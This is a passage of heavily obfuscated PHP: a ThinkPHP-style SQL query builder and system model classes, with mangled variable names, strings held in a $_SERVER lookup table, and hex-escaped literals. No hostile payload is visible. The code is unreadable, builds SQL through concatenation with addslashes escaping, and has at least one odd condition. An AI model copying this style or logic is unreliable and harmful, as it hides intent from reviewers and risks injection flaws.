isset($‚®ªÕ…ãÖˆ[$Œ‚¹¹‰¿˜É[1005]]); $Ò€àØóÖ”ï = trim($Ò€àØóÖ”ï); if (strpos($Ò€àØóÖ”ï, $Œ‚¹¹‰¿˜É[281])) { $ì àë = explode($Œ‚¹¹‰¿˜É[281], $Ò€àØóÖ”ï); $Ëë˜è„ = array(); foreach ($ì àë as $íÕ€×ŞÈ©ÀŸ => $İáìø¯¥†–) { $Åˆ³ã = $¶Ä”¶”½É ? $‚®ªÕ…ãÖˆ[$íÕ€×ŞÈ©ÀŸ] : $‚®ªÕ…ãÖˆ; $Ëë˜è„[] = $Œ‚¹¹‰¿˜É[258] . $this->parseWhereItem($this->parseKey($İáìø¯¥†–), $Åˆ³ã) . $Œ‚¹¹‰¿˜É[905]; } $ªÈÑÓ» .= implode($Œ‚¹¹‰¿˜É[1006], $Ëë˜è„); } elseif (strpos($Ò€àØóÖ”ï, $Œ‚¹¹‰¿˜É[282])) { $ì àë = explode($Œ‚¹¹‰¿˜É[282], $Ò€àØóÖ”ï); $Ëë˜è„ = array(); foreach ($ì àë as $íÕ€×ŞÈ©ÀŸ => $İáìø¯¥†–) { $Åˆ³ã = $¶Ä”¶”½É ? $‚®ªÕ…ãÖˆ[$íÕ€×ŞÈ©ÀŸ] : $‚®ªÕ…ãÖˆ; $Ëë˜è„[] = $Œ‚¹¹‰¿˜É[258] . $this->parseWhereItem($this->parseKey($İáìø¯¥†–), $Åˆ³ã) . $Œ‚¹¹‰¿˜É[905]; } $ªÈÑÓ» .= implode($Œ‚¹¹‰¿˜É[1001], $Ëë˜è„); } else { $ªÈÑÓ» .= $this->parseWhereItem($this->parseKey($Ò€àØóÖ”ï), $‚®ªÕ…ãÖˆ); } } $ªÈÑÓ» .= $Œ‚¹¹‰¿˜É[276] . $¾; } $ªÈÑÓ» = substr($ªÈÑÓ», 0, -strlen($¾)); } return empty($ªÈÑÓ») ? $Œ‚¹¹‰¿˜É[33] : $Œ‚¹¹‰¿˜É[1007] . $ªÈÑÓ»; } protected function parseWhereItem($×ù, $ÀÎÀ­øãˆ) { $Æô±ıì¨ =& $_SERVER[èÍ×öˆøÉ]; $ØÂÊ† = $Æô±ıì¨[33]; if (is_array($ÀÎÀ­øãˆ)) { if (is_string($ÀÎÀ­øãˆ[0])) { $Í² = strtolower($ÀÎÀ­øãˆ[0]); if (in_array($ÀÎÀ­øãˆ[0], array($Æô±ıì¨[991], $Æô±ıì¨[1008], $Æô±ıì¨[1009], $Æô±ıì¨[1010], $Æô±ıì¨[1011], $Æô±ıì¨[1012]))) { $ØÂÊ† .= $×ù . $Æô±ıì¨[50] . $ÀÎÀ­øãˆ[0] . $Æô±ıì¨[50] . $this->parseValue($ÀÎÀ­øãˆ[1]); } elseif (preg_match($Æô±ıì¨[1013], $ÀÎÀ­øãˆ[0])) { $ØÂÊ† .= $×ù . $Æô±ıì¨[50] . $this->exp[$Í²] . $Æô±ıì¨[50] . $this->parseValue($ÀÎÀ­øãˆ[1]); } elseif (preg_match($Æô±ıì¨[1014], $ÀÎÀ­øãˆ[0])) { if (is_array($ÀÎÀ­øãˆ[1])) { $…µÛŞÌï·¾ÚØ = isset($ÀÎÀ­øãˆ[2]) ? strtoupper($ÀÎÀ­øãˆ[2]) : $Æô±ıì¨[999]; if (in_array($…µÛŞÌï·¾ÚØ, array($Æô±ıì¨[998], $Æô±ıì¨[999], $Æô±ıì¨[1000]))) { $“˜äƒë = array(); foreach ($ÀÎÀ­øãˆ[1] as $ß˜à) { $“˜äƒë[] = $×ù . $Æô±ıì¨[50] . $this->exp[$Í²] . $Æô±ıì¨[50] . $this->parseValue($ß˜à); } $ØÂÊ† .= $Æô±ıì¨[258] . implode($Æô±ıì¨[50] . $…µÛŞÌï·¾ÚØ . $Æô±ıì¨[50], $“˜äƒë) . $Æô±ıì¨[905]; } } else { $ØÂÊ† .= $×ù . $Æô±ıì¨[50] . $this->exp[$Í²] . $Æô±ıì¨[50] . $this->parseValue($ÀÎÀ­øãˆ[1]); } } elseif ($Æô±ıì¨[295] == $Í²) { $ØÂÊ† .= $Æô±ıì¨[903] . $×ù . $Æô±ıì¨[50] . $ÀÎÀ­øãˆ[1] . $Æô±ıì¨[1015]; } elseif (preg_match($Æô±ıì¨[1016], $ÀÎÀ­øãˆ[0])) { $ØÂÊ† .= $ÀÎÀ­øãˆ[0]; } elseif (preg_match($Æô±ıì¨[1017], $ÀÎÀ­øãˆ[0])) { if (isset($ÀÎÀ­øãˆ[2]) && $Æô±ıì¨[295] == $ÀÎÀ­øãˆ[2]) { $ØÂÊ† .= $×ù . $Æô±ıì¨[50] . $this->exp[$Í²] . $Æô±ıì¨[50] . $ÀÎÀ­øãˆ[1]; } else { if (is_string($ÀÎÀ­øãˆ[1])) { $ÀÎÀ­øãˆ[1] = explode($Æô±ıì¨[47], $ÀÎÀ­øãˆ[1]); } $òŸÇÎ¨¿Å¢ = implode($Æô±ıì¨[47], $this->parseValue($ÀÎÀ­øãˆ[1])); $ØÂÊ† .= $×ù . $Æô±ıì¨[50] . $this->exp[$Í²] . $Æô±ıì¨[903] . $òŸÇÎ¨¿Å¢ . $Æô±ıì¨[905]; } } elseif (preg_match($Æô±ıì¨[1018], $ÀÎÀ­øãˆ[0])) { $˜ ä“ = is_string($ÀÎÀ­øãˆ[1]) ? explode($Æô±ıì¨[47], $ÀÎÀ­øãˆ[1]) : $ÀÎÀ­øãˆ[1]; $ØÂÊ† .= $Æô±ıì¨[903] . $×ù . $Æô±ıì¨[50] . $this->exp[$Í²] . $Æô±ıì¨[50] . $this->parseValue($˜ ä“[0]) . $Æô±ıì¨[1001] . $this->parseValue($˜ ä“[1]) . $Æô±ıì¨[276]; } else { think_exception(think_lang($Æô±ıì¨[1004]) . $Æô±ıì¨[4] . $ÀÎÀ­øãˆ[0]); } } else { $½¨ù¼¸Œñ‹ = count($ÀÎÀ­øãˆ); $«ò”¦¥š‚»‡³ = $Æô±ıì¨[33]; if (is_string($ÀÎÀ­øãˆ[$½¨ù¼¸Œñ‹ - 1])) { $«ò”¦¥š‚»‡³ = isset($ÀÎÀ­øãˆ[$½¨ù¼¸Œñ‹ - 1]) ? strtoupper($ÀÎÀ­øãˆ[$½¨ù¼¸Œñ‹ - 1]) : $Æô±ıì¨[33]; if (in_array($«ò”¦¥š‚»‡³, array($Æô±ıì¨[998], $Æô±ıì¨[999], $Æô±ıì¨[1000]))) { $½¨ù¼¸Œñ‹ = $½¨ù¼¸Œñ‹ - 1; } } else { $«ò”¦¥š‚»‡³ = $Æô±ıì¨[998]; } for ($Òœé = 0; $Òœé < $½¨ù¼¸Œñ‹; $Òœé++) { $˜ ä“ = is_array($ÀÎÀ­øãˆ[$Òœé]) ? $ÀÎÀ­øãˆ[$Òœé][1] : $ÀÎÀ­øãˆ[$Òœé]; if ($Æô±ıì¨[295] == strtolower($ÀÎÀ­øãˆ[$Òœé][0])) { $ØÂÊ† .= $Æô±ıì¨[258] . $×ù . $Æô±ıì¨[50] . $˜ ä“ . $Æô±ıì¨[1015] . $«ò”¦¥š‚»‡³ . $Æô±ıì¨[50]; } else { $¤–Şúşõµ‚‡ = is_array($ÀÎÀ­øãˆ[$Òœé]) ? $this->exp[strtolower($ÀÎÀ­øãˆ[$Òœé][0])] : $Æô±ıì¨[991]; if (!$¤–Şúşõµ‚‡ && is_array($ÀÎÀ­øãˆ[$Òœé]) && in_array($ÀÎÀ­øãˆ[$Òœé][0], array($Æô±ıì¨[991], $Æô±ıì¨[1008], $Æô±ıì¨[1009], $Æô±ıì¨[1010], $Æô±ıì¨[1011], $Æô±ıì¨[1012]))) { $¤–Şúşõµ‚‡ = $ÀÎÀ­øãˆ[$Òœé][0]; } $ØÂÊ† .= $Æô±ıì¨[258] . $×ù . $Æô±ıì¨[50] . $¤–Şúşõµ‚‡ . $Æô±ıì¨[50] . $this->parseValue($˜ ä“) . $Æô±ıì¨[1015] . $«ò”¦¥š‚»‡³ . $Æô±ıì¨[50]; } } $ØÂÊ† = substr($ØÂÊ†, 0, -4); } } else { $ØÂÊ† .= $×ù . $Æô±ıì¨[1019] . $this->parseValue($ÀÎÀ­øãˆ); } return $ØÂÊ†; } protected function parseThinkWhere($äòâÉËö, $Å¿áûÑÅÊ„) { $¤Î =& $_SERVER[èÍ×öˆøÉ]; $¦ÎàÙ = $¤Î[33]; switch ($äòâÉËö) { case $¤Î[350]: $¦ÎàÙ = $Å¿áûÑÅÊ„; break; case $¤Î[1002]: $¦ÎàÙ = is_string($Å¿áûÑÅÊ„) ? $Å¿áûÑÅÊ„ : substr($this->parseWhere($Å¿áûÑÅÊ„), 6); break; case $¤Î[1020]: parse_str($Å¿áûÑÅÊ„, $¼Î…ê); if (isset($¼Î…ê[$¤Î[997]])) { $²¹Û—©µ¤åÇ = $¤Î[50] . strtoupper($¼Î…ê[$¤Î[997]]) . $¤Î[50]; unset($¼Î…ê[$¤Î[997]]); } else { $²¹Û—©µ¤åÇ = $¤Î[1001]; } $³´Ğ²òÜ³§ğ = array(); foreach ($¼Î…ê as $ÙÅ¶¼Âî•Ğµ => $šË­Ãö) { $³´Ğ²òÜ³§ğ[] = $this->parseKey($ÙÅ¶¼Âî•Ğµ) . $¤Î[1019] . $this->parseValue($šË­Ãö); } $¦ÎàÙ = implode($²¹Û—©µ¤åÇ, $³´Ğ²òÜ³§ğ); break; } return $¦ÎàÙ; } protected function parseLimit($Ìä³) { $ıóŞ¦º¸¶‘à“ =& $_SERVER[èÍ×öˆøÉ]; return !empty($Ìä³) ? $ıóŞ¦º¸¶‘à“[48] . $Ìä³ . $ıóŞ¦º¸¶‘à“[50] : $ıóŞ¦º¸¶‘à“[33]; } protected function parseJoin($ØÂğùÁìÜ) { $·ŒÙı¾º£âè =& $_SERVER[èÍ×öˆøÉ]; $¨¢ = $·ŒÙı¾º£âè[33]; if (!empty($ØÂğùÁìÜ)) { if (is_array($ØÂğùÁìÜ)) { foreach ($ØÂğùÁìÜ as $…íĞ => $×åÓğ¨¸) { if (!1 !== stripos($×åÓğ¨¸, $·ŒÙı¾º£âè[1021])) { $¨¢ .= $·ŒÙı¾º£âè[50] . $×åÓğ¨¸; } else { $¨¢ .= $·ŒÙı¾º£âè[1022] . $×åÓğ¨¸; } } } else { $¨¢ .= $·ŒÙı¾º£âè[1022] . $ØÂğùÁìÜ; } } $¨¢ = preg_replace($·ŒÙı¾º£âè[1023], think_config($·ŒÙı¾º£âè[929]) . $·ŒÙı¾º£âè[1024], $¨¢); return $¨¢; } protected function parseOrder($¾) { $Ú¿¯š‡ =& $_SERVER[èÍ×öˆøÉ]; if (is_array($¾)) { $ãÔƒñ = array(); foreach ($¾ as $Ëë => $¯¶¥—Í) { if (is_numeric($Ëë)) { $ãÔƒñ[] = $this->parseKey($¯¶¥—Í); } else { $¯¶¥—Í = in_array(strtoupper(trim($¯¶¥—Í)), array($Ú¿¯š‡[1025], $Ú¿¯š‡[1026])) ? $Ú¿¯š‡[50] . $¯¶¥—Í : $Ú¿¯š‡[33]; if (preg_match($Ú¿¯š‡[1027], $Ëë)) { $ãÔƒñ[] = $this->parseKey($Ëë) . $¯¶¥—Í; } else { think_exception($Ú¿¯š‡[1028] . $Ëë); } } } $¾ = implode($Ú¿¯š‡[47], $ãÔƒñ); } return !empty($¾) ? $Ú¿¯š‡[1029] . $¾ : $Ú¿¯š‡[33]; } protected function parseGroup($¥™—ØüÅÅ) { $Æñº®û =& $_SERVER[èÍ×öˆøÉ]; return !empty($¥™—ØüÅÅ) ? $Æñº®û[1030] . $¥™—ØüÅÅ : $Æñº®û[33]; } protected function parseHaving($­³¢õ) { $„û†ãÜâ— =& $_SERVER[èÍ×öˆøÉ]; return !empty($­³¢õ) ? $„û†ãÜâ—[1031] . $­³¢õ : $„û†ãÜâ—[33]; } protected function parseComment($¯Éª—ò) { $Ç„€Â =& $_SERVER[èÍ×öˆøÉ]; return !empty($¯Éª—ò) ? $Ç„€Â[1032] . $¯Éª—ò . $Ç„€Â[1033] : $Ç„€Â[33]; } protected function parseDistinct($àö¨›») { $¢Ë¤¾ =& $_SERVER[èÍ×öˆøÉ]; return !empty($àö¨›») ? $¢Ë¤¾[1034] : $¢Ë¤¾[33]; } protected function parseUnion($™ˆşÆÆÌÅì) { $Æô¾ =& $_SERVER[èÍ×öˆøÉ]; if (empty($™ˆşÆÆÌÅì)) { return $Æô¾[33]; } if (isset($™ˆşÆÆÌÅì[$Æô¾[346]])) { $Šö = $Æô¾[1035]; unset($™ˆşÆÆÌÅì[$Æô¾[346]]); } else { $Šö = $Æô¾[1036]; } foreach ($™ˆşÆÆÌÅì as $Ã¥Êì³Ãà) { $ø©[] = $Šö . (is_array($Ã¥Êì³Ãà) ? $this->buildSelectSql($Ã¥Êì³Ãà) : $Ã¥Êì³Ãà); } return implode($Æô¾[50], $ø©); } public function insert($·Ğ£İ, $òı = array(), $·ÙÇ = false) { $ÜÓÂ =& $_SERVER[èÍ×öˆøÉ]; $Ü¯ = $ñŸ±‰“ƒìö¥ = array(); $this->model = $òı[$ÜÓÂ[279]]; foreach ($·Ğ£İ as $ˆîë¥·ú²† => $ˆÀ úÂ›) { if (is_array($ˆÀ úÂ›) && $ÜÓÂ[295] == $ˆÀ úÂ›[0]) { $ñŸ±‰“ƒìö¥[] = $this->parseKey($ˆîë¥·ú²†); $Ü¯[] = $ˆÀ úÂ›[1]; } elseif (is_scalar($ˆÀ úÂ›) || is_null($ˆÀ úÂ›)) { $ñŸ±‰“ƒìö¥[] = $this->parseKey($ˆîë¥·ú²†); $Ü¯[] = $this->parseValue($ˆÀ úÂ›); } } $Ù = ($·ÙÇ ? $ÜÓÂ[907] : $ÜÓÂ[908]) . $ÜÓÂ[909] . $this->parseTable($òı[$ÜÓÂ[277]]) . $ÜÓÂ[903] . implode($ÜÓÂ[47], $ñŸ±‰“ƒìö¥) . $ÜÓÂ[904] . implode($ÜÓÂ[47], $Ü¯) . $ÜÓÂ[905]; $Ù .= $this->parseLock(isset($òı[$ÜÓÂ[846]]) ? $òı[$ÜÓÂ[846]] : !1); $Ù .= $this->parseComment(!empty($òı[$ÜÓÂ[352]]) ? $òı[$ÜÓÂ[352]] : $ÜÓÂ[33]); return $this->execute($Ù, $this->parseBind(!empty($òı[$ÜÓÂ[283]]) ? $òı[$ÜÓÂ[283]] : array())); } public function selectInsert($Èñèà÷¥õÓšÇ, $êô‰½½¡«, $×¡úû¤éûã = array()) { $Ã¢îÕ±Ğ =& $_SERVER[èÍ×öˆøÉ]; $this->model = $×¡úû¤éûã[$Ã¢îÕ±Ğ[279]]; if (is_string($Èñèà÷¥õÓšÇ)) { $Èñèà÷¥õÓšÇ = explode($Ã¢îÕ±Ğ[47], $Èñèà÷¥õÓšÇ); } array_walk($Èñèà÷¥õÓšÇ, array($this, $Ã¢îÕ±Ğ[906])); $÷Âİ„àº = $Ã¢îÕ±Ğ[1037] . $this->parseTable($êô‰½½¡«) . $Ã¢îÕ±Ğ[903] . implode($Ã¢îÕ±Ğ[47], $Èñèà÷¥õÓšÇ) . $Ã¢îÕ±Ğ[1015]; $÷Âİ„àº .= $this->buildSelectSql($×¡úû¤éûã); return $this->execute($÷Âİ„àº, $this->parseBind(!empty($×¡úû¤éûã[$Ã¢îÕ±Ğ[283]]) ? $×¡úû¤éûã[$Ã¢îÕ±Ğ[283]] : array())); } public function update($˜ô¡Çö¬ú½, $½ÚÊ¸õ‚) { $è¿À¹şÅ‹øÀ§ =& $_SERVER[èÍ×öˆøÉ]; $this->model = $½ÚÊ¸õ‚[$è¿À¹şÅ‹øÀ§[279]]; $‡Ö±«ˆÕÁÊ¼‹ = $è¿À¹şÅ‹øÀ§[1038] . $this->parseTable($½ÚÊ¸õ‚[$è¿À¹şÅ‹øÀ§[277]]) . $this->parseSet($˜ô¡Çö¬ú½) . $this->parseWhere(!empty($½ÚÊ¸õ‚[$è¿À¹şÅ‹øÀ§[273]]) ? $½ÚÊ¸õ‚[$è¿À¹şÅ‹øÀ§[273]] : $è¿À¹şÅ‹øÀ§[33]) . $this->parseOrder(!empty($½ÚÊ¸õ‚[$è¿À¹şÅ‹øÀ§[363]]) ? $½ÚÊ¸õ‚[$è¿À¹şÅ‹øÀ§[363]] : $è¿À¹şÅ‹øÀ§[33]) . $this->parseLimit(!empty($½ÚÊ¸õ‚[$è¿À¹şÅ‹øÀ§[290]]) ? $½ÚÊ¸õ‚[$è¿À¹şÅ‹øÀ§[290]] : $è¿À¹şÅ‹øÀ§[33]) . $this->parseLock(isset($½ÚÊ¸õ‚[$è¿À¹şÅ‹øÀ§[846]]) ? $½ÚÊ¸õ‚[$è¿À¹şÅ‹øÀ§[846]] : !1) . $this->parseComment(!empty($½ÚÊ¸õ‚[$è¿À¹şÅ‹øÀ§[352]]) ? $½ÚÊ¸õ‚[$è¿À¹şÅ‹øÀ§[352]] : $è¿À¹şÅ‹øÀ§[33]); return $this->execute($‡Ö±«ˆÕÁÊ¼‹, $this->parseBind(!empty($½ÚÊ¸õ‚[$è¿À¹şÅ‹øÀ§[283]]) ? $½ÚÊ¸õ‚[$è¿À¹şÅ‹øÀ§[283]] : array())); } public function delete($œÃœã»ß = array()) { $ˆ½àŸ·Øêá„ =& $_SERVER[èÍ×öˆøÉ]; $this->model = $œÃœã»ß[$ˆ½àŸ·Øêá„[279]]; $Ñ­» = $ˆ½àŸ·Øêá„[1039] . $this->parseTable($œÃœã»ß[$ˆ½àŸ·Øêá„[277]]) . $this->parseWhere(!empty($œÃœã»ß[$ˆ½àŸ·Øêá„[273]]) ? $œÃœã»ß[$ˆ½àŸ·Øêá„[273]] : $ˆ½àŸ·Øêá„[33]) . $this->parseOrder(!empty($œÃœã»ß[$ˆ½àŸ·Øêá„[363]]) ? $œÃœã»ß[$ˆ½àŸ·Øêá„[363]] : $ˆ½àŸ·Øêá„[33]) . $this->parseLimit(!empty($œÃœã»ß[$ˆ½àŸ·Øêá„[290]]) ? $œÃœã»ß[$ˆ½àŸ·Øêá„[290]] : $ˆ½àŸ·Øêá„[33]) . $this->parseLock(isset($œÃœã»ß[$ˆ½àŸ·Øêá„[846]]) ? $œÃœã»ß[$ˆ½àŸ·Øêá„[846]] : !1) . $this->parseComment(!empty($œÃœã»ß[$ˆ½àŸ·Øêá„[352]]) ? $œÃœã»ß[$ˆ½àŸ·Øêá„[352]] : $ˆ½àŸ·Øêá„[33]); return $this->execute($Ñ­», $this->parseBind(!empty($œÃœã»ß[$ˆ½àŸ·Øêá„[283]]) ? $œÃœã»ß[$ˆ½àŸ·Øêá„[283]] : array())); } public function select($çÏƒñÏÂä = array()) { $óØ™“Î„¥Ø =& $_SERVER[èÍ×öˆøÉ]; $this->model = $çÏƒñÏÂä[$óØ™“Î„¥Ø[279]]; $ˆ±Çîøö† = $this->buildSelectSql($çÏƒñÏÂä); $áùñµ÷è˜Ù = isset($çÏƒñÏÂä[$óØ™“Î„¥Ø[347]]) ? $çÏƒñÏÂä[$óØ™“Î„¥Ø[347]] : !1; if ($áùñµ÷è˜Ù) { $öš¦ÏÕÔÕ‹ñ = is_string($áùñµ÷è˜Ù[$óØ™“Î„¥Ø[93]]) ? $áùñµ÷è˜Ù[$óØ™“Î„¥Ø[93]] : $óØ™“Î„¥Ø[1040] . md5($ˆ±Çîøö†); $²‚™™Œâ = think_cache($öš¦ÏÕÔÕ‹ñ, $óØ™“Î„¥Ø[33], $áùñµ÷è˜Ù); if (!1 !== $²‚™™Œâ) { return $²‚™™Œâ; } } $ÌƒÖ™¼ø = $this->query($ˆ±Çîøö†, $this->parseBind(!empty($çÏƒñÏÂä[$óØ™“Î„¥Ø[283]]) ? $çÏƒñÏÂä[$óØ™“Î„¥Ø[283]] : array())); if ($áùñµ÷è˜Ù && !1 !== $ÌƒÖ™¼ø) { think_cache($öš¦ÏÕÔÕ‹ñ, $ÌƒÖ™¼ø, $áùñµ÷è˜Ù); } return $ÌƒÖ™¼ø; } public function buildSelectSql($µ‰ = array()) { $Ş°ŞôÓù·È =& $_SERVER[èÍ×öˆøÉ]; if (isset($µ‰[$Ş°ŞôÓù·È[351]])) { if (strpos($µ‰[$Ş°ŞôÓù·È[351]], $Ş°ŞôÓù·È[47])) { list($¸¤äÊ¾ë‰, $½) = explode($Ş°ŞôÓù·È[47], $µ‰[$Ş°ŞôÓù·È[351]]); } else { $¸¤äÊ¾ë‰ = $µ‰[$Ş°ŞôÓù·È[351]]; } $¸¤äÊ¾ë‰ = $¸¤äÊ¾ë‰ ? $¸¤äÊ¾ë‰ : 1; $½ = isset($½) ? $½ : (is_numeric($µ‰[$Ş°ŞôÓù·È[290]]) ? $µ‰[$Ş°ŞôÓù·È[290]] : 20); $¯ó‘æç¯¦» = $½ * ((int) $¸¤äÊ¾ë‰ - 1); $µ‰[$Ş°ŞôÓù·È[290]] = $¯ó‘æç¯¦» . $Ş°ŞôÓù·È[47] . $½; } if (think_config($Ş°ŞôÓù·È[1041])) { $ƒá–“ï = $Ş°ŞôÓù·È[1042] . md5(serialize($µ‰)); $¥ÄÛ¼ = think_cache($ƒá–“ï); if ($¥ÄÛ¼) { return $¥ÄÛ¼; } } $õÍ³Åˆ = $this->parseSql($this->selectSql, $µ‰); $õÍ³Åˆ .= $this->parseLock(isset($µ‰[$Ş°ŞôÓù·È[846]]) ? $µ‰[$Ş°ŞôÓù·È[846]] : !1); if (isset($ƒá–“ï)) { think_cache($ƒá–“ï, $õÍ³Åˆ); } return $õÍ³Åˆ; } public function parseSql($ŠŠ¯Ğß¼Ê, $Ã“ = array()) { $ôµ×™Ğ‹Â =& $_SERVER[èÍ×öˆøÉ]; $ŠŠ¯Ğß¼Ê = str_replace(array($ôµ×™Ğ‹Â[1043], $ôµ×™Ğ‹Â[1044], $ôµ×™Ğ‹Â[1045], $ôµ×™Ğ‹Â[1046], $ôµ×™Ğ‹Â[1047], $ôµ×™Ğ‹Â[1048], $ôµ×™Ğ‹Â[1049], $ôµ×™Ğ‹Â[1050], $ôµ×™Ğ‹Â[1051], $ôµ×™Ğ‹Â[1052], $ôµ×™Ğ‹Â[1053]), array($this->parseTable("{$Ã“[$ôµ×™Ğ‹Â[277]]}"), $this->parseDistinct(isset($Ã“[$ôµ×™Ğ‹Â[1054]]) ? $Ã“[$ôµ×™Ğ‹Â[1054]] : !1), $this->parseField(!empty($Ã“[$ôµ×™Ğ‹Â[271]]) ? $Ã“[$ôµ×™Ğ‹Â[271]] : $ôµ×™Ğ‹Â[182]), $this->parseJoin(!empty($Ã“[$ôµ×™Ğ‹Â[280]]) ? $Ã“[$ôµ×™Ğ‹Â[280]] : $ôµ×™Ğ‹Â[33]), $this->parseWhere(!empty($Ã“[$ôµ×™Ğ‹Â[273]]) ? $Ã“[$ôµ×™Ğ‹Â[273]] : $ôµ×™Ğ‹Â[33]), $this->parseGroup(!empty($Ã“[$ôµ×™Ğ‹Â[509]]) ? $Ã“[$ôµ×™Ğ‹Â[509]] : $ôµ×™Ğ‹Â[33]), $this->parseHaving(!empty($Ã“[$ôµ×™Ğ‹Â[1055]]) ? $Ã“[$ôµ×™Ğ‹Â[1055]] : $ôµ×™Ğ‹Â[33]), $this->parseOrder(!empty($Ã“[$ôµ×™Ğ‹Â[363]]) ? $Ã“[$ôµ×™Ğ‹Â[363]] : $ôµ×™Ğ‹Â[33]), $this->parseLimit(!empty($Ã“[$ôµ×™Ğ‹Â[290]]) ? $Ã“[$ôµ×™Ğ‹Â[290]] : $ôµ×™Ğ‹Â[33]), $this->parseUnion(!empty($Ã“[$ôµ×™Ğ‹Â[345]]) ? $Ã“[$ôµ×™Ğ‹Â[345]] : $ôµ×™Ğ‹Â[33]), $this->parseComment(!empty($Ã“[$ôµ×™Ğ‹Â[352]]) ? $Ã“[$ôµ×™Ğ‹Â[352]] : $ôµ×™Ğ‹Â[33])), $ŠŠ¯Ğß¼Ê); return $ŠŠ¯Ğß¼Ê; } public function getLastSql($„É– åÍû²á = '') { return $„É– åÍû²á ? $this->modelSql[$„É– åÍû²á] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($©¨¿Ü) { return addslashes($©¨¿Ü); } public function setModel($¸î) { $this->model = $¸î; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto f÷ÇµÉé£; fÍäÑ˜âœï: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\x6d\56\114\x69\x67\x68\164\x41\x70\160"; public $modelType = "\x53\x79\x73\x74\x65\x6d\117\x70\x74\x69\157\x6e"; public $field = array("\x6e\141\x6d\145", "\x67\x72\157\x75\160", "\x64\x65\163\x63", "\x63\157\x6e\164\x65\x6e\x74"); public function listData($ü‰† = false, $µÈ“‚´‹åì = "\x6d\157\144\151\x66\171\124\x69\x6d\x65", $™øÒ = true) { return parent::listData($ü‰†, $µÈ“‚´‹åì, $™øÒ); } public function remove($¢Ó»„ÅŸø) { $´« = $this->findByName($¢Ó»„ÅŸø); if (!$´«) { return !1; } return parent::remove($´«[$_SERVER[èÍ×öˆøÉ][395]]); } public function add($×½œñ) { if ($this->findByName($×½œñ[$_SERVER[èÍ×öˆøÉ][28]])) { return !1; } return parent::insert($×½œñ); } public function update($Ò, $…Ò³Ğ’€ø¶ú) { $ğ‰“¹µß =& $_SERVER[èÍ×öˆøÉ]; $šÌ®çè = $this->findByName($Ò); $ˆÍ‰Ô­§è¨° = $this->findByName($…Ò³Ğ’€ø¶ú[$ğ‰“¹µß[28]]); if (!$šÌ®çè || $ˆÍ‰Ô­§è¨° && $ˆÍ‰Ô­§è¨°[$ğ‰“¹µß[395]] != $šÌ®çè[$ğ‰“¹µß[395]]) { return !1; } return parent::update($šÌ®çè[$ğ‰“¹µß[395]], $…Ò³Ğ’€ø¶ú); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\155\x5f\x6c\157\x67"; protected $dataAuto = array(array("\143\162\x65\x61\x74\145\x54\x69\155\145", "\164\151\x6d\145", "\151\156\x73\x65\162\164", "\x66\165\156\143\x74\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ìÎ™•Àõ =& $_SERVER[èÍ×öˆøÉ]; return array($ìÎ™•Àõ[2065] => LNG($ìÎ™•Àõ[2066]), $ìÎ™•Àõ[2067] => LNG($ìÎ™•Àõ[2068]), $ìÎ™•Àõ[1691] => LNG($ìÎ™•Àõ[2069]), $ìÎ™•Àõ[2070] => LNG($ìÎ™•Àõ[2071]), $ìÎ™•Àõ[2072] => LNG($ìÎ™•Àõ[2073]), $ìÎ™•Àõ[2074] => LNG($ìÎ™•Àõ[2075]), $ìÎ™•Àõ[2076] => LNG($ìÎ™•Àõ[2077]), $ìÎ™•Àõ[1721] => LNG($ìÎ™•Àõ[2077]), $ìÎ™•Àõ[1722] => LNG($ìÎ™•Àõ[2078]), $ìÎ™•Àõ[2079] => LNG($ìÎ™•Àõ[2080]), $ìÎ™•Àõ[2081] => LNG($ìÎ™•Àõ[2082]), $ìÎ™•Àõ[2083] => LNG($ìÎ™•Àõ[2084]), $ìÎ™•Àõ[2085] => LNG($ìÎ™•Àõ[2086]), $ìÎ™•Àõ[1719] => LNG($ìÎ™•Àõ[2087]), $ìÎ™•Àõ[2088] => LNG($ìÎ™•Àõ[2089]), $ìÎ™•Àõ[1726] => LNG($ìÎ™•Àõ[2090]), $ìÎ™•Àõ[2091] => LNG($ìÎ™•Àõ[2092]), $ìÎ™•Àõ[2093] => LNG($ìÎ™•Àõ[2094]), $ìÎ™•Àõ[2095] => LNG($ìÎ™•Àõ[2096]), $ìÎ™•Àõ[2097] => LNG($ìÎ™•Àõ[2098]), $ìÎ™•Àõ[1729] => LNG($ìÎ™•Àõ[2099]), $ìÎ™•Àõ[1730] => LNG($ìÎ™•Àõ[2100]), $ìÎ™•Àõ[2101] => LNG($ìÎ™•Àõ[2102]), $ìÎ™•Àõ[2103] => LNG($ìÎ™•Àõ[2104]), $ìÎ™•Àõ[2105] => LNG($ìÎ™•Àõ[2106]), $ìÎ™•Àõ[1724] => LNG($ìÎ™•Àõ[2107]), $ìÎ™•Àõ[2108] => LNG($ìÎ™•Àõ[2109]), $ìÎ™•Àõ[1723] => LNG($ìÎ™•Àõ[2110]), $ìÎ™•Àõ[2111] => LNG($ìÎ™•Àõ[2112]), $ìÎ™•Àõ[2113] => LNG($ìÎ™•Àõ[2114]), $ìÎ™•Àõ[2115] => LNG($ìÎ™•Àõ[2116]), $ìÎ™•Àõ[2117] => LNG($ìÎ™•Àõ[2117]), $ìÎ™•Àõ[2118] => LNG($ìÎ™•Àõ[1695]), $ìÎ™•Àõ[2119] => LNG($ìÎ™•Àõ[2120]), $ìÎ™•Àõ[2121] => LNG($ìÎ™•Àõ[2122]), $ìÎ™•Àõ[2123] => LNG($ìÎ™•Àõ[2124]), $ìÎ™•Àõ[2125] => LNG($ìÎ™•Àõ[2126]), $ìÎ™•Àõ[2127] => LNG($ìÎ™•Àõ[2128]), $ìÎ™•Àõ[2129] => LNG($ìÎ™•Àõ[2129]), $ìÎ™•Àõ[2130] => LNG($ìÎ™•Àõ[2131]), $ìÎ™•Àõ[2132] => LNG($ìÎ™•Àõ[2133]), $ìÎ™•Àõ[2134] => LNG($ìÎ™•Àõ[2135]), $ìÎ™•Àõ[2136] => LNG($ìÎ™•Àõ[2137]), $ìÎ™•Àõ[2138] => LNG($ìÎ™•Àõ[2139]), $ìÎ™•Àõ[2140] => LNG($ìÎ™•Àõ[2141])); } private function typeFile() { $Ï…‘‘ö²ô =& $_SERVER[èÍ×öˆøÉ]; $¢ÙïÎ±ş = array($Ï…‘‘ö²ô[1726] => 